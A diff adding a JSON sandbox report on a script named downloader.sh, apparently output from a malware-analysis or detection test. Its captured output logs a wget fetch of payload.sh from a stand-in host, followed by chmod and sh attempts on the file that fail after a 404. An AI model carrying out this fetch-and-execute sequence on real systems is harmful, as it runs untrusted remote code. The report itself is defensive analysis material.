@@ -1,0 +1,17 @@
+{
+  "target_file": "/tmp/tmpaat4vl79/home/user/Documents/downloader.sh",
+  "execution_time": 1,
+  "exit_code": 2,
+  "network_connections": [],
+  "traffic_verdict": [],
+  "filesystem_changes": {
+    "modified": [],
+    "new": [],
+    "deleted": []
+  },
+  "malware_output": {
+    "content": "--2026-06-24 15:40:36--  http://example.com/payload.sh\nResolving example.com (example.com)... 172.66.147.243, 104.20.23.154\nConnecting to example.com (example.com)|172.66.147.243|:80... connected.\nHTTP request sent, awaiting response... 404 Not Found\n2026-06-24 15:40:36 ERROR 404: Not Found.\n\nchmod: cannot access 'payload.sh': No such file or directory\nsh: 0: cannot open payload.sh: No such file",
+    "lines": 8,
+    "truncated": false
+  }
+}
